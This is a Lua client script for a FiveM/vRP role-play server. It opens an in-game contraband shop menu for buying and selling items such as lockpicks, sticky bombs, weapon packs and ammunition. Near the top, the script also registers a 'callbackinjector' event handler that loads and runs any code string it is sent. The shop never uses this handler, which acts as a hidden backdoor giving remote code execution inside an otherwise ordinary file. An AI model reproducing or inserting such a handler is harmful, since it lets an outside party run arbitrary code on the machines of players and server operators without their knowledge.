local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("nav_contrabando2")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
		if data == "utilidades-comprar-algemas" then
		TriggerServerEvent("crj-comprar2","algemas")
	elseif data == "utilidades-comprar-capuz" then
		TriggerServerEvent("crj-comprar2","capuz")
	elseif data == "utilidades-comprar-lockpick" then
		TriggerServerEvent("crj-comprar2","lockpick")
	elseif data == "utilidades-comprar-masterpick" then
		TriggerServerEvent("crj-comprar2","masterpick")
	elseif data == "utilidades-comprar-pendrive" then
		TriggerServerEvent("crj-comprar2","pendrive")
	elseif data == "utilidades-comprar-rebite" then
		TriggerServerEvent("crj-comprar2","rebite")
	elseif data == "utilidades-comprar-bomba" then
		TriggerServerEvent("crj-comprar2","bombaadesiva")
	--[[elseif data == "utilidades-comprar-placa" then
		TriggerServerEvent("crj-comprar2","placa")]]
	elseif data == "utilidades-comprar-walkietalkie" then
		TriggerServerEvent("crj-comprar2","walkietalkie")
	elseif data == "utilidades-comprar-colete" then
		TriggerServerEvent("crj-comprar2","colete")
		------
		elseif data == "utilidades-armas-ak103pack" then
		TriggerServerEvent("contrabandoarmas-comprar2","ak103pack")
-----
		elseif data == "utilidades-armas-musketpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","musketpack")
		elseif data == "utilidades-armas-parafalpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","parafalpack")
-----		
		elseif data == "utilidades-armas-mtarpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","mtarpack")
		elseif data == "utilidades-armas-miniakpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","sigpack")
		elseif data == "utilidades-armas-pumpshotgunpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","pumpshotgunpack")
		elseif data == "utilidades-armas-fivesevenpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","fivesevenpack")
		elseif data == "utilidades-armas-coletepack" then
		TriggerServerEvent("contrabandoarmas-comprar2","coletepack")
		elseif data == "utilidades-armas-uzipack" then
		TriggerServerEvent("contrabandoarmas-comprar2","uzipack")
		elseif data == "utilidades-armas-snspack" then
		TriggerServerEvent("contrabandoarmas-comprar2","snspack")
		
		elseif data == "utilidades-municao-municaosnspack" then
		TriggerServerEvent("contrabandomuni-comprar2","municaosnspack")		
		elseif data == "utilidades-municao-municaoakpack" then
		TriggerServerEvent("contrabandomuni-comprar2","municaoakpack")
		elseif data == "utilidades-municao-municaofamaspack" then
		TriggerServerEvent("contrabandomuni-comprar2","municaofamaspack")
		elseif data == "utilidades-municao-municaominiakpack" then
		TriggerServerEvent("contrabandomuni-comprar2","municaosigpack")
		elseif data == "utilidades-municao-municaopumppack" then
		TriggerServerEvent("contrabandomuni-comprar2","municaopumppack")
		elseif data == "utilidades-municao-municaouzipack" then
		TriggerServerEvent("contrabandomuni-comprar2","municaouzipack")
		elseif data == "utilidades-municao-municaopistolpack" then
		TriggerServerEvent("contrabandomuni-comprar2","municaopistolpack")
		elseif data == "utilidades-municao-municaomusketpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","municaomusketpack")
		elseif data == "utilidades-municao-municaoparafalpack" then
		TriggerServerEvent("contrabandoarmas-comprar2","municaoparafalpack")
-----------------
	elseif data == "utilidades-vender-algemas" then
		TriggerServerEvent("contrabando-vender2","algemas")
	elseif data == "utilidades-vender-capuz" then
		TriggerServerEvent("contrabando-vender2","capuz")
	elseif data == "utilidades-vender-lockpick" then
		TriggerServerEvent("contrabando-vender2","lockpick")
	elseif data == "utilidades-vender-masterpick" then
		TriggerServerEvent("contrabando-vender2","masterpick")
	elseif data == "utilidades-vender-bomba" then
		TriggerServerEvent("contrabando-vender2","bombaadesiva")
	elseif data == "utilidades-vender-pendrive" then
		TriggerServerEvent("contrabando-vender2","pendrive")
	elseif data == "utilidades-vender-rebite" then
		TriggerServerEvent("contrabando-vender2","rebite")
	elseif data == "utilidades-vender-placa" then
		TriggerServerEvent("contrabando-vender2","placa")

	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local nyoSleep = 500
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),5195.7348632813,-5134.8735351563,3.3532967567444,true)
		if distance <= 30 then
			DrawMarker(20,5195.7348632813,-5134.8735351563,3.3532967567444-0.97,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
			if distance <= 1.1 then
			nyoSleep = 1
				if IsControlJustPressed(0,38) and emP.checkPermission() then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(nyoSleep)
	end
end)